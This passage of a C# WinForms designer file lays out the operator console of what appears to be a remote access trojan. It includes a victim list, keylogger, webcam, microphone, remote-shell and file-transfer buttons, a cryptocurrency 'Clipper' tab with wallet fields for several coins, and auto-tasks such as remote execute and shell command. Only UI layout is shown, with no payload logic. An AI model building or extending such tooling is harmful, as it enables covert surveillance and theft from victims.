            hOfflineUserPC.Width = 180;
            // 
            // hOfflineVersion
            // 
            hOfflineVersion.Text = "Version";
            hOfflineVersion.Width = 80;
            // 
            // hOfflineLastSeen
            // 
            hOfflineLastSeen.Text = "Last Seen";
            hOfflineLastSeen.Width = 140;
            // 
            // hOfflineFirstSeen
            // 
            hOfflineFirstSeen.Text = "First Seen";
            hOfflineFirstSeen.Width = 140;
            // 
            // hOfflineCountry
            // 
            hOfflineCountry.Text = "Country";
            hOfflineCountry.Width = 140;
            // 
            // hOfflineOS
            // 
            hOfflineOS.Text = "Operating System";
            hOfflineOS.Width = 220;
            // 
            // hOfflineAccountType
            // 
            hOfflineAccountType.Text = "Account Type";
            hOfflineAccountType.Width = 100;
            // 
            // OfflineClientsContextMenuStrip
            // 
            OfflineClientsContextMenuStrip.Items.AddRange(new ToolStripItem[] { removeOfflineClientsToolStripMenuItem });
            OfflineClientsContextMenuStrip.Name = "OfflineClientsContextMenuStrip";
            OfflineClientsContextMenuStrip.Size = new Size(189, 26);
            // 
            // removeOfflineClientsToolStripMenuItem
            // 
            removeOfflineClientsToolStripMenuItem.Name = "removeOfflineClientsToolStripMenuItem";
            removeOfflineClientsToolStripMenuItem.ShortcutKeys = Keys.Delete;
            removeOfflineClientsToolStripMenuItem.Size = new Size(188, 22);
            removeOfflineClientsToolStripMenuItem.Text = "Remove Selected";
            removeOfflineClientsToolStripMenuItem.Click += removeOfflineClientsToolStripMenuItem_Click;
            // 
            // tabStats
            // 
            tabStats.Controls.Add(statsElementHost);
            tabStats.Location = new Point(4, 24);
            tabStats.Margin = new Padding(0);
            tabStats.Name = "tabStats";
            tabStats.Size = new Size(1136, 463);
            tabStats.TabIndex = 1;
            tabStats.Text = "Stats";
            tabStats.UseVisualStyleBackColor = true;
            // 
            // statsElementHost
            // 
            statsElementHost.Dock = DockStyle.Fill;
            statsElementHost.Location = new Point(0, 0);
            statsElementHost.Name = "statsElementHost";
            statsElementHost.Size = new Size(1136, 463);
            statsElementHost.TabIndex = 0;
            // 
            // tabPage1
            // 
            tabPage1.Controls.Add(wpfClientsHost);
            tabPage1.Controls.Add(lstClients);
            tabPage1.Controls.Add(tableLayoutPanel1);
            tabPage1.Controls.Add(DebugLogRichBox);
            tabPage1.Controls.Add(splitter1);
            tabPage1.Location = new Point(4, 24);
            tabPage1.Margin = new Padding(0);
            tabPage1.Name = "tabPage1";
            tabPage1.Size = new Size(1136, 463);
            tabPage1.TabIndex = 1;
            tabPage1.Text = "Clients";
            tabPage1.UseVisualStyleBackColor = true;
            // 
            // wpfClientsHost
            // 
            wpfClientsHost.ContextMenuStrip = contextMenuStrip;
            wpfClientsHost.Dock = DockStyle.Fill;
            wpfClientsHost.Location = new Point(0, 0);
            wpfClientsHost.Name = "wpfClientsHost";
            wpfClientsHost.Size = new Size(849, 349);
            wpfClientsHost.TabIndex = 22;
            // 
            // lstClients
            // 
            lstClients.Columns.AddRange(new ColumnHeader[] { hIP, hNick, hTag, hUserPC, hVersion, hStatus, hCurrentWindow, hUserStatus, hCountry, hOS, hAccountType });
            lstClients.Dock = DockStyle.Fill;
            lstClients.Font = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point, 0);
            lstClients.FullRowSelect = true;
            lstClients.Location = new Point(0, 0);
            lstClients.Name = "lstClients";
            lstClients.ShowItemToolTips = true;
            lstClients.Size = new Size(849, 349);
            lstClients.SmallImageList = imgFlags;
            lstClients.TabIndex = 1;
            lstClients.UseCompatibleStateImageBehavior = false;
            lstClients.View = View.Details;
            lstClients.ColumnWidthChanged += lstClients_ColumnWidthChanged;
            lstClients.DrawItem += lstClients_DrawItem;
            lstClients.SelectedIndexChanged += lstClients_SelectedIndexChanged;
            lstClients.MouseWheel += lstClients_MouseWheel;
            lstClients.Resize += lstClients_Resize;
            // 
            // hIP
            // 
            hIP.Text = "IP Address";
            hIP.Width = 112;
            // 
            // hNick
            // 
            hNick.Text = "Nickname";
            hNick.Width = 112;
            // 
            // hTag
            // 
            hTag.Text = "Tag";
            // 
            // hUserPC
            // 
            hUserPC.Text = "User@PC";
            hUserPC.Width = 175;
            // 
            // hVersion
            // 
            hVersion.Text = "Version";
            hVersion.Width = 66;
            // 
            // hStatus
            // 
            hStatus.Text = "Status";
            hStatus.Width = 78;
            // 
            // hCurrentWindow
            // 
            hCurrentWindow.Text = "Current Window";
            hCurrentWindow.Width = 200;
            // 
            // hUserStatus
            // 
            hUserStatus.Text = "User Status";
            hUserStatus.Width = 72;
            // 
            // hCountry
            // 
            hCountry.Text = "Country";
            hCountry.Width = 117;
            // 
            // hOS
            // 
            hOS.Text = "Operating System";
            hOS.Width = 222;
            // 
            // hAccountType
            // 
            hAccountType.Text = "Account Type";
            hAccountType.Width = 82;
            // 
            // tableLayoutPanel1
            // 
            tableLayoutPanel1.ColumnCount = 1;
            tableLayoutPanel1.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 100F));
            tableLayoutPanel1.Controls.Add(label1, 0, 0);
            tableLayoutPanel1.Controls.Add(pictureBoxMain, 0, 1);
            tableLayoutPanel1.Controls.Add(tblLayoutQuickButtons, 0, 2);
            tableLayoutPanel1.Controls.Add(gBoxClientInfo, 0, 3);
            tableLayoutPanel1.Dock = DockStyle.Right;
            tableLayoutPanel1.Location = new Point(849, 0);
            tableLayoutPanel1.Margin = new Padding(0);
            tableLayoutPanel1.Name = "tableLayoutPanel1";
            tableLayoutPanel1.RowCount = 4;
            tableLayoutPanel1.RowStyles.Add(new RowStyle(SizeType.Absolute, 14F));
            tableLayoutPanel1.RowStyles.Add(new RowStyle(SizeType.Absolute, 166F));
            tableLayoutPanel1.RowStyles.Add(new RowStyle(SizeType.Absolute, 30F));
            tableLayoutPanel1.RowStyles.Add(new RowStyle());
            tableLayoutPanel1.Size = new Size(287, 349);
            tableLayoutPanel1.TabIndex = 32;
            tableLayoutPanel1.Paint += tableLayoutPanel1_Paint;
            // 
            // label1
            // 
            label1.AutoSize = true;
            label1.Location = new Point(3, 0);
            label1.Name = "label1";
            label1.Size = new Size(79, 13);
            label1.TabIndex = 8;
            label1.Text = "Client Preview";
            // 
            // pictureBoxMain
            // 
            pictureBoxMain.Dock = DockStyle.Fill;
            pictureBoxMain.Image = Properties.Resources.nopreviewbest_cropped;
            pictureBoxMain.InitialImage = null;
            pictureBoxMain.Location = new Point(3, 17);
            pictureBoxMain.Name = "pictureBoxMain";
            pictureBoxMain.Size = new Size(281, 160);
            pictureBoxMain.SizeMode = PictureBoxSizeMode.StretchImage;
            pictureBoxMain.TabIndex = 31;
            pictureBoxMain.TabStop = false;
            // 
            // tblLayoutQuickButtons
            // 
            tblLayoutQuickButtons.ColumnCount = 8;
            tblLayoutQuickButtons.ColumnStyles.Add(new ColumnStyle(SizeType.Absolute, 30F));
            tblLayoutQuickButtons.ColumnStyles.Add(new ColumnStyle(SizeType.Absolute, 30F));
            tblLayoutQuickButtons.ColumnStyles.Add(new ColumnStyle(SizeType.Absolute, 30F));
            tblLayoutQuickButtons.ColumnStyles.Add(new ColumnStyle(SizeType.Absolute, 30F));
            tblLayoutQuickButtons.ColumnStyles.Add(new ColumnStyle(SizeType.Absolute, 30F));
            tblLayoutQuickButtons.ColumnStyles.Add(new ColumnStyle(SizeType.Absolute, 30F));
            tblLayoutQuickButtons.ColumnStyles.Add(new ColumnStyle(SizeType.Absolute, 30F));
            tblLayoutQuickButtons.ColumnStyles.Add(new ColumnStyle(SizeType.Absolute, 77F));
            tblLayoutQuickButtons.Controls.Add(btnQuickListenToMicrophone, 2, 0);
            tblLayoutQuickButtons.Controls.Add(btnQuickRemoteDesktop, 0, 0);
            tblLayoutQuickButtons.Controls.Add(btnQuickWebcam, 1, 0);
            tblLayoutQuickButtons.Controls.Add(btnQuickKeylogger, 6, 0);
            tblLayoutQuickButtons.Controls.Add(btnQuickFileTransfer, 5, 0);
            tblLayoutQuickButtons.Controls.Add(btnQuickRemoteShell, 4, 0);
            tblLayoutQuickButtons.Controls.Add(btnQuickFileExplorer, 3, 0);
            tblLayoutQuickButtons.Controls.Add(chkDisablePreview, 7, 0);
            tblLayoutQuickButtons.Dock = DockStyle.Fill;
            tblLayoutQuickButtons.Location = new Point(0, 180);
            tblLayoutQuickButtons.Margin = new Padding(0);
            tblLayoutQuickButtons.Name = "tblLayoutQuickButtons";
            tblLayoutQuickButtons.RowCount = 1;
            tblLayoutQuickButtons.RowStyles.Add(new RowStyle(SizeType.Percent, 100F));
            tblLayoutQuickButtons.Size = new Size(287, 30);
            tblLayoutQuickButtons.TabIndex = 32;
            // 
            // btnQuickListenToMicrophone
            // 
            btnQuickListenToMicrophone.Image = Properties.Resources.sound;
            btnQuickListenToMicrophone.Location = new Point(63, 3);
            btnQuickListenToMicrophone.Name = "btnQuickListenToMicrophone";
            btnQuickListenToMicrophone.Size = new Size(24, 24);
            btnQuickListenToMicrophone.TabIndex = 9;
            btnQuickListenToMicrophone.UseVisualStyleBackColor = true;
            btnQuickListenToMicrophone.Click += button1_Click_1;
            // 
            // btnQuickRemoteDesktop
            // 
            btnQuickRemoteDesktop.Image = Properties.Resources.monitor;
            btnQuickRemoteDesktop.Location = new Point(3, 3);
            btnQuickRemoteDesktop.Name = "btnQuickRemoteDesktop";
            btnQuickRemoteDesktop.Size = new Size(24, 24);
            btnQuickRemoteDesktop.TabIndex = 4;
            btnQuickRemoteDesktop.UseVisualStyleBackColor = true;
            btnQuickRemoteDesktop.Click += button2_Click;
            // 
            // btnQuickWebcam
            // 
            btnQuickWebcam.Image = Properties.Resources.webcam;
            btnQuickWebcam.Location = new Point(33, 3);
            btnQuickWebcam.Name = "btnQuickWebcam";
            btnQuickWebcam.Size = new Size(24, 24);
            btnQuickWebcam.TabIndex = 3;
            btnQuickWebcam.UseVisualStyleBackColor = true;
            btnQuickWebcam.Click += button1_Click;
            // 
            // btnQuickKeylogger
            // 
            btnQuickKeylogger.Image = Properties.Resources.keyboard_magnify;
            btnQuickKeylogger.Location = new Point(183, 3);
            btnQuickKeylogger.Name = "btnQuickKeylogger";
            btnQuickKeylogger.Size = new Size(24, 24);
            btnQuickKeylogger.TabIndex = 8;
            btnQuickKeylogger.UseVisualStyleBackColor = true;
            btnQuickKeylogger.Click += button6_Click;
            // 
            // btnQuickFileTransfer
            // 
            btnQuickFileTransfer.Image = Properties.Resources.drive_go;
            btnQuickFileTransfer.Location = new Point(153, 3);
            btnQuickFileTransfer.Name = "btnQuickFileTransfer";
            btnQuickFileTransfer.Size = new Size(24, 24);
            btnQuickFileTransfer.TabIndex = 7;
            btnQuickFileTransfer.UseVisualStyleBackColor = true;
            btnQuickFileTransfer.Click += button5_Click;
            // 
            // btnQuickRemoteShell
            // 
            btnQuickRemoteShell.Image = Properties.Resources.terminal;
            btnQuickRemoteShell.Location = new Point(123, 3);
            btnQuickRemoteShell.Name = "btnQuickRemoteShell";
            btnQuickRemoteShell.Size = new Size(24, 24);
            btnQuickRemoteShell.TabIndex = 6;
            btnQuickRemoteShell.UseVisualStyleBackColor = true;
            btnQuickRemoteShell.Click += button4_Click;
            // 
            // btnQuickFileExplorer
            // 
            btnQuickFileExplorer.Image = Properties.Resources.folder;
            btnQuickFileExplorer.Location = new Point(93, 3);
            btnQuickFileExplorer.Name = "btnQuickFileExplorer";
            btnQuickFileExplorer.Size = new Size(24, 24);
            btnQuickFileExplorer.TabIndex = 5;
            btnQuickFileExplorer.UseVisualStyleBackColor = true;
            btnQuickFileExplorer.Click += button3_Click;
            // 
            // chkDisablePreview
            // 
            chkDisablePreview.Anchor = AnchorStyles.None;
            chkDisablePreview.AutoSize = true;
            chkDisablePreview.Location = new Point(213, 6);
            chkDisablePreview.Name = "chkDisablePreview";
            chkDisablePreview.Size = new Size(71, 17);
            chkDisablePreview.TabIndex = 10;
            chkDisablePreview.Text = "Disable Preview";
            chkDisablePreview.UseVisualStyleBackColor = true;
            // 
            // gBoxClientInfo
            // 
            gBoxClientInfo.Controls.Add(clientInfoListView);
            gBoxClientInfo.Dock = DockStyle.Fill;
            gBoxClientInfo.Location = new Point(2, 212);
            gBoxClientInfo.Margin = new Padding(2);
            gBoxClientInfo.Name = "gBoxClientInfo";
            gBoxClientInfo.Size = new Size(283, 137);
            gBoxClientInfo.TabIndex = 9;
            gBoxClientInfo.TabStop = false;
            gBoxClientInfo.Text = "Client Info";
            // 
            // clientInfoListView
            // 
            clientInfoListView.Columns.AddRange(new ColumnHeader[] { Names, Stats });
            clientInfoListView.Dock = DockStyle.Fill;
            clientInfoListView.FullRowSelect = true;
            clientInfoListView.HeaderStyle = ColumnHeaderStyle.None;
            clientInfoListView.Items.AddRange(new ListViewItem[] { listViewItem1, listViewItem2, listViewItem3, listViewItem4, listViewItem5, listViewItem6, listViewItem7, listViewItem8, listViewItem9 });
            clientInfoListView.Location = new Point(3, 18);
            clientInfoListView.Name = "clientInfoListView";
            clientInfoListView.Size = new Size(277, 116);
            clientInfoListView.TabIndex = 0;
            clientInfoListView.UseCompatibleStateImageBehavior = false;
            clientInfoListView.View = View.Details;
            // 
            // Names
            // 
            Names.Text = "Names";
            Names.Width = 122;
            // 
            // Stats
            // 
            Stats.Text = "Stats";
            Stats.Width = 134;
            // 
            // DebugLogRichBox
            // 
            DebugLogRichBox.BorderStyle = BorderStyle.None;
            DebugLogRichBox.ContextMenuStrip = DebugContextMenuStrip;
            DebugLogRichBox.Dock = DockStyle.Bottom;
            DebugLogRichBox.Font = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point, 0);
            DebugLogRichBox.ForeColor = SystemColors.InfoText;
            DebugLogRichBox.Location = new Point(0, 349);
            DebugLogRichBox.Name = "DebugLogRichBox";
            DebugLogRichBox.ReadOnly = true;
            DebugLogRichBox.Size = new Size(1136, 111);
            DebugLogRichBox.TabIndex = 35;
            DebugLogRichBox.Text = "";
            DebugLogRichBox.Visible = false;
            // 
            // DebugContextMenuStrip
            // 
            DebugContextMenuStrip.Items.AddRange(new ToolStripItem[] { saveLogsToolStripMenuItem, saveSlectedToolStripMenuItem, toolStripSeparator1, clearLogsToolStripMenuItem });
            DebugContextMenuStrip.Name = "DebugContextMenuStrip";
            DebugContextMenuStrip.Size = new Size(146, 76);
            // 
            // saveLogsToolStripMenuItem
            // 
            saveLogsToolStripMenuItem.Name = "saveLogsToolStripMenuItem";
            saveLogsToolStripMenuItem.Size = new Size(145, 22);
            saveLogsToolStripMenuItem.Text = "Save Logs";
            saveLogsToolStripMenuItem.Click += saveLogsToolStripMenuItem_Click;
            // 
            // saveSlectedToolStripMenuItem
            // 
            saveSlectedToolStripMenuItem.Name = "saveSlectedToolStripMenuItem";
            saveSlectedToolStripMenuItem.Size = new Size(145, 22);
            saveSlectedToolStripMenuItem.Text = "Save Selected";
            saveSlectedToolStripMenuItem.Click += saveSlectedToolStripMenuItem_Click;
            // 
            // toolStripSeparator1
            // 
            toolStripSeparator1.Name = "toolStripSeparator1";
            toolStripSeparator1.Size = new Size(142, 6);
            // 
            // clearLogsToolStripMenuItem
            // 
            clearLogsToolStripMenuItem.Name = "clearLogsToolStripMenuItem";
            clearLogsToolStripMenuItem.Size = new Size(145, 22);
            clearLogsToolStripMenuItem.Text = "Clear Logs";
            clearLogsToolStripMenuItem.Click += clearLogsToolStripMenuItem_Click;
            // 
            // splitter1
            // 
            splitter1.Dock = DockStyle.Bottom;
            splitter1.Location = new Point(0, 460);
            splitter1.Name = "splitter1";
            splitter1.Size = new Size(1136, 3);
            splitter1.TabIndex = 34;
            splitter1.TabStop = false;
            splitter1.Visible = false;
            // 
            // tabHeatMap
            // 
            tabHeatMap.Controls.Add(heatMapElementHost);
            tabHeatMap.Location = new Point(4, 24);
            tabHeatMap.Margin = new Padding(0);
            tabHeatMap.Name = "tabHeatMap";
            tabHeatMap.Size = new Size(1136, 463);
            tabHeatMap.TabIndex = 2;
            tabHeatMap.Text = "Heat Map";
            tabHeatMap.UseVisualStyleBackColor = true;
            // 
            // heatMapElementHost
            // 
            heatMapElementHost.Dock = DockStyle.Fill;
            heatMapElementHost.Location = new Point(0, 0);
            heatMapElementHost.Name = "heatMapElementHost";
            heatMapElementHost.Size = new Size(1136, 463);
            heatMapElementHost.TabIndex = 0;
            // 
            // tabPage2
            // 
            tabPage2.Controls.Add(lstNoti);
            tabPage2.Controls.Add(notificationStatusPanel);
            tabPage2.Location = new Point(4, 24);
            tabPage2.Margin = new Padding(0);
            tabPage2.Name = "tabPage2";
            tabPage2.Size = new Size(1136, 463);
            tabPage2.TabIndex = 2;
            tabPage2.Text = "Notifications";
            tabPage2.UseVisualStyleBackColor = true;
            // 
            // lstNoti
            // 
            lstNoti.Columns.AddRange(new ColumnHeader[] { columnHeader1, columnHeader2, columnHeader3, columnHeader11 });
            lstNoti.ContextMenuStrip = NotificationContextMenuStrip;
            lstNoti.Dock = DockStyle.Fill;
            lstNoti.Font = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point, 0);
            lstNoti.FullRowSelect = true;
            lstNoti.Location = new Point(0, 32);
            lstNoti.Margin = new Padding(0);
            lstNoti.Name = "lstNoti";
            lstNoti.ShowItemToolTips = true;
            lstNoti.Size = new Size(1136, 431);
            lstNoti.SmallImageList = imgFlags;
            lstNoti.TabIndex = 2;
            lstNoti.UseCompatibleStateImageBehavior = false;
            lstNoti.View = View.Details;
            // 
            // columnHeader1
            // 
            columnHeader1.Text = "User@PC";
            columnHeader1.Width = 150;
            // 
            // columnHeader2
            // 
            columnHeader2.Text = "Time";
            columnHeader2.Width = 140;
            // 
            // columnHeader3
            // 
            columnHeader3.Text = "Event";
            columnHeader3.Width = 200;
            // 
            // columnHeader11
            // 
            columnHeader11.Text = "Parameter";
            columnHeader11.Width = 642;
            // 
            // NotificationContextMenuStrip
            // 
            NotificationContextMenuStrip.Items.AddRange(new ToolStripItem[] { addKeywordsToolStripMenuItem, clearSelectedToolStripMenuItem });
            NotificationContextMenuStrip.Name = "NotificationContextMenuStrip";
            NotificationContextMenuStrip.Size = new Size(156, 48);
            // 
            // addKeywordsToolStripMenuItem
            // 
            addKeywordsToolStripMenuItem.Image = Properties.Resources.add;
            addKeywordsToolStripMenuItem.Name = "addKeywordsToolStripMenuItem";
            addKeywordsToolStripMenuItem.Size = new Size(155, 22);
            addKeywordsToolStripMenuItem.Text = "Add Key-words";
            addKeywordsToolStripMenuItem.Click += addKeywordsToolStripMenuItem_Click;
            // 
            // clearSelectedToolStripMenuItem
            // 
            clearSelectedToolStripMenuItem.Image = Properties.Resources.delete;
            clearSelectedToolStripMenuItem.Name = "clearSelectedToolStripMenuItem";
            clearSelectedToolStripMenuItem.Size = new Size(155, 22);
            clearSelectedToolStripMenuItem.Text = "Clear Selected";
            clearSelectedToolStripMenuItem.Click += clearSelectedToolStripMenuItem_Click;
            // 
            // notificationStatusPanel
            // 
            notificationStatusPanel.Controls.Add(lblNotificationStatus);
            notificationStatusPanel.Dock = DockStyle.Top;
            notificationStatusPanel.Location = new Point(0, 0);
            notificationStatusPanel.Name = "notificationStatusPanel";
            notificationStatusPanel.Padding = new Padding(12, 6, 12, 6);
            notificationStatusPanel.Size = new Size(1136, 32);
            notificationStatusPanel.TabIndex = 3;
            // 
            // lblNotificationStatus
            // 
            lblNotificationStatus.AutoSize = true;
            lblNotificationStatus.Dock = DockStyle.Fill;
            lblNotificationStatus.Font = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point, 0);
            lblNotificationStatus.Location = new Point(12, 6);
            lblNotificationStatus.Name = "lblNotificationStatus";
            lblNotificationStatus.Size = new Size(132, 15);
            lblNotificationStatus.TabIndex = 0;
            lblNotificationStatus.Text = "Pending notifications: 0";
            lblNotificationStatus.TextAlign = ContentAlignment.MiddleLeft;
            // 
            // tabPage3
            // 
            tabPage3.Controls.Add(cryptoGroupBox);
            tabPage3.Controls.Add(ClipperCheckbox);
            tabPage3.Location = new Point(4, 24);
            tabPage3.Name = "tabPage3";
            tabPage3.Padding = new Padding(3);
            tabPage3.Size = new Size(1136, 463);
            tabPage3.TabIndex = 3;
            tabPage3.Text = "ClipperTabPage";
            tabPage3.UseVisualStyleBackColor = true;
            // 
            // cryptoGroupBox
            // 
            cryptoGroupBox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
            cryptoGroupBox.Controls.Add(BCHTextBox);
            cryptoGroupBox.Controls.Add(label10);
            cryptoGroupBox.Controls.Add(TRXTextBox);
            cryptoGroupBox.Controls.Add(label9);
            cryptoGroupBox.Controls.Add(XRPTextBox);
            cryptoGroupBox.Controls.Add(label8);
            cryptoGroupBox.Controls.Add(DASHTextBox);
            cryptoGroupBox.Controls.Add(label7);
            cryptoGroupBox.Controls.Add(SOLTextBox);
            cryptoGroupBox.Controls.Add(label6);
            cryptoGroupBox.Controls.Add(XMRTextBox);
            cryptoGroupBox.Controls.Add(label5);
            cryptoGroupBox.Controls.Add(LTCTextBox);
            cryptoGroupBox.Controls.Add(label4);
            cryptoGroupBox.Controls.Add(ETHTextBox);
            cryptoGroupBox.Controls.Add(label3);
            cryptoGroupBox.Controls.Add(BTCTextBox);
            cryptoGroupBox.Controls.Add(label2);
            cryptoGroupBox.Location = new Point(8, 29);
            cryptoGroupBox.Name = "cryptoGroupBox";
            cryptoGroupBox.Size = new Size(1104, 279);
            cryptoGroupBox.TabIndex = 1;
            cryptoGroupBox.TabStop = false;
            cryptoGroupBox.Text = "Settings";
            cryptoGroupBox.Enter += groupBox1_Enter;
            // 
            // BCHTextBox
            // 
            BCHTextBox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
            BCHTextBox.Location = new Point(50, 245);
            BCHTextBox.Name = "BCHTextBox";
            BCHTextBox.Size = new Size(1048, 22);
            BCHTextBox.TabIndex = 17;
            // 
            // label10
            // 
            label10.AutoSize = true;
            label10.Location = new Point(6, 250);
            label10.Name = "label10";
            label10.Size = new Size(32, 13);
            label10.TabIndex = 16;
            label10.Text = "BCH:";
            // 
            // TRXTextBox
            // 
            TRXTextBox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
            TRXTextBox.Location = new Point(50, 217);
            TRXTextBox.Name = "TRXTextBox";
            TRXTextBox.Size = new Size(1048, 22);
            TRXTextBox.TabIndex = 15;
            // 
            // label9
            // 
            label9.AutoSize = true;
            label9.Location = new Point(6, 222);
            label9.Name = "label9";
            label9.Size = new Size(28, 13);
            label9.TabIndex = 14;
            label9.Text = "TRX:";
            // 
            // XRPTextBox
            // 
            XRPTextBox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
            XRPTextBox.Location = new Point(50, 189);
            XRPTextBox.Name = "XRPTextBox";
            XRPTextBox.Size = new Size(1048, 22);
            XRPTextBox.TabIndex = 13;
            // 
            // label8
            // 
            label8.AutoSize = true;
            label8.Location = new Point(6, 194);
            label8.Name = "label8";
            label8.Size = new Size(29, 13);
            label8.TabIndex = 12;
            label8.Text = "XRP:";
            // 
            // DASHTextBox
            // 
            DASHTextBox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
            DASHTextBox.Location = new Point(50, 161);
            DASHTextBox.Name = "DASHTextBox";
            DASHTextBox.Size = new Size(1048, 22);
            DASHTextBox.TabIndex = 11;
            // 
            // label7
            // 
            label7.AutoSize = true;
            label7.Location = new Point(6, 166);
            label7.Name = "label7";
            label7.Size = new Size(39, 13);
            label7.TabIndex = 10;
            label7.Text = "DASH:";
            // 
            // SOLTextBox
            // 
            SOLTextBox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
            SOLTextBox.Location = new Point(50, 133);
            SOLTextBox.Name = "SOLTextBox";
            SOLTextBox.Size = new Size(1048, 22);
            SOLTextBox.TabIndex = 9;
            // 
            // label6
            // 
            label6.AutoSize = true;
            label6.Location = new Point(6, 138);
            label6.Name = "label6";
            label6.Size = new Size(30, 13);
            label6.TabIndex = 8;
            label6.Text = "SOL:";
            // 
            // XMRTextBox
            // 
            XMRTextBox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
            XMRTextBox.Location = new Point(50, 105);
            XMRTextBox.Name = "XMRTextBox";
            XMRTextBox.Size = new Size(1048, 22);
            XMRTextBox.TabIndex = 7;
            // 
            // label5
            // 
            label5.AutoSize = true;
            label5.Location = new Point(6, 110);
            label5.Name = "label5";
            label5.Size = new Size(33, 13);
            label5.TabIndex = 6;
            label5.Text = "XMR:";
            // 
            // LTCTextBox
            // 
            LTCTextBox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
            LTCTextBox.Location = new Point(50, 77);
            LTCTextBox.Name = "LTCTextBox";
            LTCTextBox.Size = new Size(1048, 22);
            LTCTextBox.TabIndex = 5;
            // 
            // label4
            // 
            label4.AutoSize = true;
            label4.Location = new Point(6, 82);
            label4.Name = "label4";
            label4.Size = new Size(25, 13);
            label4.TabIndex = 4;
            label4.Text = "LTC:";
            // 
            // ETHTextBox
            // 
            ETHTextBox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
            ETHTextBox.Location = new Point(50, 49);
            ETHTextBox.Name = "ETHTextBox";
            ETHTextBox.Size = new Size(1048, 22);
            ETHTextBox.TabIndex = 3;
            // 
            // label3
            // 
            label3.AutoSize = true;
            label3.Location = new Point(6, 54);
            label3.Name = "label3";
            label3.Size = new Size(29, 13);
            label3.TabIndex = 2;
            label3.Text = "ETH:";
            // 
            // BTCTextBox
            // 
            BTCTextBox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
            BTCTextBox.Location = new Point(50, 21);
            BTCTextBox.Name = "BTCTextBox";
            BTCTextBox.Size = new Size(1048, 22);
            BTCTextBox.TabIndex = 1;
            // 
            // label2
            // 
            label2.AutoSize = true;
            label2.Location = new Point(6, 26);
            label2.Name = "label2";
            label2.Size = new Size(28, 13);
            label2.TabIndex = 0;
            label2.Text = "BTC:";
            // 
            // ClipperCheckbox
            // 
            ClipperCheckbox.AutoSize = true;
            ClipperCheckbox.Location = new Point(8, 6);
            ClipperCheckbox.Name = "ClipperCheckbox";
            ClipperCheckbox.Size = new Size(50, 17);
            ClipperCheckbox.TabIndex = 0;
            ClipperCheckbox.Text = "Start";
            ClipperCheckbox.UseVisualStyleBackColor = true;
            ClipperCheckbox.CheckedChanged += ClipperCheckbox_CheckedChanged;
            // 
            // tabPage4
            // 
            tabPage4.Controls.Add(lstTasks);
            tabPage4.Location = new Point(4, 24);
            tabPage4.Margin = new Padding(0);
            tabPage4.Name = "tabPage4";
            tabPage4.Size = new Size(1136, 463);
            tabPage4.TabIndex = 4;
            tabPage4.Text = "AutoTasksTabPage";
            tabPage4.UseVisualStyleBackColor = true;
            // 
            // lstTasks
            // 
            lstTasks.Columns.AddRange(new ColumnHeader[] { columnHeader4, columnHeader5, columnHeader8 });
            lstTasks.ContextMenuStrip = TasksContextMenuStrip;
            lstTasks.Dock = DockStyle.Fill;
            lstTasks.Font = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point, 0);
            lstTasks.FullRowSelect = true;
            lstTasks.Location = new Point(0, 0);
            lstTasks.Margin = new Padding(0);
            lstTasks.Name = "lstTasks";
            lstTasks.ShowItemToolTips = true;
            lstTasks.Size = new Size(1136, 463);
            lstTasks.SmallImageList = imgFlags;
            lstTasks.TabIndex = 3;
            lstTasks.UseCompatibleStateImageBehavior = false;
            lstTasks.View = View.Details;
            // 
            // columnHeader4
            // 
            columnHeader4.Text = "Task";
            columnHeader4.Width = 150;
            // 
            // columnHeader5
            // 
            columnHeader5.Text = "Host";
            columnHeader5.Width = 450;
            // 
            // columnHeader8
            // 
            columnHeader8.Text = "Arguments";
            columnHeader8.Width = 532;
            // 
            // TasksContextMenuStrip
            // 
            TasksContextMenuStrip.Items.AddRange(new ToolStripItem[] { addTaskToolStripMenuItem, deleteTasksToolStripMenuItem });
            TasksContextMenuStrip.Name = "TasksContextMenuStrip";
            TasksContextMenuStrip.Size = new Size(139, 48);
            // 
            // addTaskToolStripMenuItem
            // 
            addTaskToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { remoteExecuteToolStripMenuItem1, shellCommandToolStripMenuItem, kematianToolStripMenuItem, showMessageBoxToolStripMenuItem1, excludeSystemDriveToolStripMenuItem, winREToolStripMenuItem1 });
            addTaskToolStripMenuItem.Image = Properties.Resources.add;
            addTaskToolStripMenuItem.Name = "addTaskToolStripMenuItem";
            addTaskToolStripMenuItem.Size = new Size(138, 22);
            addTaskToolStripMenuItem.Text = "Add Task";
            // 
            // remoteExecuteToolStripMenuItem1
            // 
            remoteExecuteToolStripMenuItem1.Image = Properties.Resources.drive_go;
            remoteExecuteToolStripMenuItem1.Name = "remoteExecuteToolStripMenuItem1";
            remoteExecuteToolStripMenuItem1.Size = new Size(185, 22);
            remoteExecuteToolStripMenuItem1.Text = "Remote Execute";
            remoteExecuteToolStripMenuItem1.Click += remoteExecuteToolStripMenuItem1_Click;
            // 
            // shellCommandToolStripMenuItem
            // 
            shellCommandToolStripMenuItem.Image = Properties.Resources.terminal;
            shellCommandToolStripMenuItem.Name = "shellCommandToolStripMenuItem";
            shellCommandToolStripMenuItem.Size = new Size(185, 22);
            shellCommandToolStripMenuItem.Text = "Shell Command";
            shellCommandToolStripMenuItem.Click += shellCommandToolStripMenuItem_Click;
            // 
            // kematianToolStripMenuItem
            // 
            kematianToolStripMenuItem.Name = "kematianToolStripMenuItem";
            kematianToolStripMenuItem.Size = new Size(185, 22);
            // 
            // showMessageBoxToolStripMenuItem1
            // 
            showMessageBoxToolStripMenuItem1.Image = Properties.Resources.information;
